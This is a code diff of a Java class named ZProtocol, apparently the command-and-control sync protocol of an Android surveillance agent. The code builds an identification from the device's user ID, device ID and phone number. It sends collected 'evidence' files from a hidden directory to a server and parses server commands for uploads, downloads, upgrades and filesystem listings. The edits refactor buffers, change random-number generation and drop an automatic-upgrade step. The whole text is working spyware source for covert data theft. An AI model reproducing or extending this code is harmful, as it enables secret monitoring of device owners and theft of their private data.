@@ -1,12 +1,29 @@
 package com.ht.RCSAndroidGUI.action.sync;
 
 import java.io.EOFException;
+import java.io.IOException;
+import java.security.NoSuchAlgorithmException;
+import java.security.SecureRandom;
 import java.util.Date;
 import java.util.Vector;
 
 import com.ht.RCSAndroidGUI.Debug;
+import com.ht.RCSAndroidGUI.Device;
+import com.ht.RCSAndroidGUI.EvidenceCollector;
+import com.ht.RCSAndroidGUI.Status;
+import com.ht.RCSAndroidGUI.crypto.CryptoException;
+import com.ht.RCSAndroidGUI.crypto.Encryption;
+import com.ht.RCSAndroidGUI.crypto.EncryptionPKCS5;
+import com.ht.RCSAndroidGUI.crypto.Keys;
+import com.ht.RCSAndroidGUI.crypto.SHA1Digest;
+import com.ht.RCSAndroidGUI.file.AutoFile;
+import com.ht.RCSAndroidGUI.file.Directory;
+import com.ht.RCSAndroidGUI.file.Path;
 import com.ht.RCSAndroidGUI.utils.Check;
+import com.ht.RCSAndroidGUI.utils.DataReadBuffer;
+import com.ht.RCSAndroidGUI.utils.DataWriteBuffer;
 import com.ht.RCSAndroidGUI.utils.Utils;
+import com.ht.RCSAndroidGUI.utils.WChar;
 
 
 public class ZProtocol extends Protocol {
@@ -24,6 +41,17 @@ public class ZProtocol extends Protocol {
 
     boolean upgrade;
     Vector upgradeFiles = new Vector();
+    
+    public ZProtocol(){
+    	try {
+			random = SecureRandom.getInstance("SHA1PRNG");
+		} catch (NoSuchAlgorithmException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+    }
+    
+    SecureRandom random;
 
     public boolean perform() {
         //#ifdef DBC
@@ -35,8 +63,9 @@ public class ZProtocol extends Protocol {
 
         // key init
         cryptoConf.makeKey(Encryption.getKeys().getChallengeKey());
-        RandomSource.getBytes(Kd);
-        RandomSource.getBytes(Nonce);
+        
+        random.nextBytes(Kd);
+        random.nextBytes(Nonce);
 
         //#ifdef DEBUG
         debug.trace("Kd: " + Utils.byteArrayToHex(Kd));
@@ -121,10 +150,7 @@ public class ZProtocol extends Protocol {
             debug.info("***** Log *****");
             //#endif  
 
-            sendEvidences(Path.SD());
-            if (!Path.SD().equals(Path.USER())) {
-                sendEvidences(Path.USER());
-            }
+            sendEvidences(Path.hidden());
 
             //#ifdef DEBUG
             debug.info("***** END *****");
@@ -159,7 +185,7 @@ public class ZProtocol extends Protocol {
         Keys keys = Encryption.getKeys();
 
         byte[] data = new byte[104];
-        DataBuffer dataBuffer = new DataBuffer(data, 0, data.length, false);
+        DataWriteBuffer dataBuffer = new DataWriteBuffer(data, 0, data.length);
 
         // filling structure
         dataBuffer.write(Kd);
@@ -172,7 +198,7 @@ public class ZProtocol extends Protocol {
 
         dataBuffer.write(Utils.padByteArray(keys.getBuildId(), 16));
         dataBuffer.write(keys.getInstanceId());
-        dataBuffer.write(Utils.padByteArray(Device.getSubtype(), 16));
+        dataBuffer.write(Utils.padByteArray(keys.getSubtype(), 16));
 
         //#ifdef DBC
         Check.ensures(dataBuffer.getPosition() == 84,
@@ -183,7 +209,7 @@ public class ZProtocol extends Protocol {
         final SHA1Digest digest = new SHA1Digest();
         digest.update(Utils.padByteArray(keys.getBuildId(), 16));
         digest.update(keys.getInstanceId());
-        digest.update(Utils.padByteArray(Device.getSubtype(), 16));
+        digest.update(Utils.padByteArray(keys.getSubtype(), 16));
         digest.update(keys.getConfKey());
 
         byte[] sha1 = digest.getDigest();
@@ -291,8 +317,7 @@ public class ZProtocol extends Protocol {
     }
 
     protected byte[] forgeIdentification() {
-        final Device device = Device.getInstance();
-        device.refreshData();
+        final Device device = Device.self();
 
         byte[] userid = WChar.pascalize(device.getWUserId());
         byte[] deviceid = WChar.pascalize(device.getWDeviceId());
@@ -302,10 +327,10 @@ public class ZProtocol extends Protocol {
 
         byte[] content = new byte[len];
 
-        DataBuffer dataBuffer = new DataBuffer(content, 0, content.length,
-                false);
+        DataWriteBuffer dataBuffer = new DataWriteBuffer(content, 0, content.length
+               );
         //dataBuffer.writeInt(Proto.ID);
-        dataBuffer.write(Device.getVersion());
+        dataBuffer.write(device.getVersion());
         dataBuffer.write(userid);
         dataBuffer.write(deviceid);
         dataBuffer.write(phone);
@@ -331,8 +356,8 @@ public class ZProtocol extends Protocol {
             debug.info("got Identification");
             //#endif
 
-            DataBuffer dataBuffer = new DataBuffer(result, 4,
-                    result.length - 4, false);
+            DataReadBuffer dataBuffer = new DataReadBuffer(result, 4,
+                    result.length - 4);
             try {
                 // la totSize e' discutibile
                 int totSize = dataBuffer.readInt();
@@ -349,7 +374,7 @@ public class ZProtocol extends Protocol {
                 //#ifdef DEBUG
                 debug.trace("parseIdentification drift: " + drift);
                 //#endif
-                Status.getInstance().drift = drift;
+                Status.self().drift = drift;
 
                 int numElem = dataBuffer.readInt();
 
@@ -363,7 +388,7 @@ public class ZProtocol extends Protocol {
                     //#endif                   
                 }
 
-            } catch (EOFException e) {
+            } catch (IOException e) {
                 //#ifdef DEBUG
                 debug.error(e);
                 //#endif
@@ -419,8 +444,8 @@ public class ZProtocol extends Protocol {
             //#ifdef DEBUG
             debug.trace("parseDownload, OK");
             //#endif
-            DataBuffer dataBuffer = new DataBuffer(result, 4,
-                    result.length - 4, false);
+            DataReadBuffer dataBuffer = new DataReadBuffer(result, 4,
+                    result.length - 4);
             try {
                 // la totSize e' discutibile
                 int totSize = dataBuffer.readInt();
@@ -437,7 +462,7 @@ public class ZProtocol extends Protocol {
                     Protocol.saveDownloadLog(file);
                 }
 
-            } catch (EOFException e) {
+            } catch (IOException e) {
                 //#ifdef DEBUG
                 debug.error(e);
                 //#endif
@@ -467,8 +492,8 @@ public class ZProtocol extends Protocol {
             //#ifdef DEBUG
             debug.trace("parseUpload, OK");
             //#endif
-            DataBuffer dataBuffer = new DataBuffer(result, 4,
-                    result.length - 4, false);
+            DataReadBuffer dataBuffer = new DataReadBuffer(result, 4,
+                    result.length - 4);
             try {
                 int totSize = dataBuffer.readInt();
                 int left = dataBuffer.readInt();
@@ -489,24 +514,9 @@ public class ZProtocol extends Protocol {
                 //#endif
                 Protocol.saveUpload(filename, content);
 
-                if (filename.equals(Protocol.UPGRADE_FILENAME_0)
-                        || filename.equals(Protocol.UPGRADE_FILENAME_1)) {
-                    upgrade = true;
-                    //#ifdef DEBUG
-                    debug.trace("parseUpload: there's something to upgrade");
-                    //#endif
-                }
-
-                if (left == 0 && upgrade) {
-                    //#ifdef DEBUG
-                    debug.trace("parseUpload: last file, go to upgrade");
-                    //#endif
-                    upgradeMulti();
-                }
-
                 return left > 0;
 
-            } catch (EOFException e) {
+            } catch (IOException e) {
                 //#ifdef DEBUG
                 debug.error(e);
                 //#endif
@@ -532,8 +542,8 @@ public class ZProtocol extends Protocol {
             //#ifdef DEBUG
             debug.trace("parseUpgrade, OK");
             //#endif
-            DataBuffer dataBuffer = new DataBuffer(result, 4,
-                    result.length - 4, false);
+            DataReadBuffer dataBuffer = new DataReadBuffer(result, 4,
+                    result.length - 4);
             try {
                 int totSize = dataBuffer.readInt();
                 int left = dataBuffer.readInt();
@@ -564,7 +574,7 @@ public class ZProtocol extends Protocol {
 
                 return left > 0;
 
-            } catch (EOFException e) {
+            } catch (IOException e) {
                 //#ifdef DEBUG
                 debug.error(e);
                 //#endif
@@ -589,8 +599,8 @@ public class ZProtocol extends Protocol {
             //#ifdef DEBUG
             debug.trace("parseFileSystem, OK");
             //#endif
-            DataBuffer dataBuffer = new DataBuffer(result, 4,
-                    result.length - 4, false);
+            DataReadBuffer dataBuffer = new DataReadBuffer(result, 4,
+                    result.length - 4);
             try {
                 int totSize = dataBuffer.readInt();
                 int numElem = dataBuffer.readInt();
@@ -606,7 +616,7 @@ public class ZProtocol extends Protocol {
                     Protocol.saveFilesystem(depth, file);
                 }
 
-            } catch (EOFException e) {
+            } catch (IOException e) {
                 //#ifdef DEBUG
                 debug.error("parse error: " + e);
                 //#endif
@@ -630,7 +640,7 @@ public class ZProtocol extends Protocol {
         debug.info("sendEvidences from: " + basePath);
         //#endif
 
-        EvidenceCollector logCollector = EvidenceCollector.getInstance();
+        EvidenceCollector logCollector = EvidenceCollector.self();
 
         final Vector dirs = logCollector.scanForDirLogs(basePath);
         final int dsize = dirs.size();
@@ -647,7 +657,7 @@ public class ZProtocol extends Protocol {
             for (int j = 0; j < lsize; ++j) {
                 final String logName = (String) logs.elementAt(j);
                 final String fullLogName = basePath + dir + logName;
-                final AutoFile file = new AutoFile(fullLogName, false);
+                final AutoFile file = new AutoFile(fullLogName);
                 if (!file.exists()) {
                     //#ifdef DEBUG
                     debug.error("File doesn't exist: " + fullLogName);
